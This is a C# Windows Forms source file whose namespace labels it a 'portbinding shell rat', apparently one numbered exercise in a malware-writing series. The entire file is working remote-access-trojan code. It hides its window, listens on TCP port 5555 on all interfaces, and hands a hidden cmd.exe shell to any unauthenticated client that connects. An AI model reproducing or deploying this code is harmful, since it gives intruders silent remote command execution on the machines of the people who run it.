using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;// for Process
using System.Drawing;
using System.IO;    // for Streams
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace _06_portbinding_shell_rat
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 5555);
            tcpListener.Start();
            for (; ; ) RunServer();
        }

        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);

            processCmd = new Process();
            processCmd.StartInfo.FileName = "cmd.exe";
            processCmd.StartInfo.CreateNoWindow = true;
            //processCmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processCmd.StartInfo.UseShellExecute = false;
            processCmd.StartInfo.RedirectStandardOutput = true;
            processCmd.StartInfo.RedirectStandardInput = true;
            processCmd.StartInfo.RedirectStandardError = true;
            processCmd.OutputDataReceived +=
            new DataReceivedEventHandler(CmdOutputDataHandler);
            processCmd.Start();
            processCmd.BeginOutputReadLine();
            strInput = new StringBuilder();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    processCmd.StandardInput.WriteLine(strInput);
                    if (strInput.ToString().LastIndexOf("exit") >= 0)
                        StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw
                    new ArgumentException();
                    strInput = strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                };
                //Application.DoEvents();
            }//--end of while loop
        }//--end of RunServer()

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
            socketForClient.Close();
        }
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
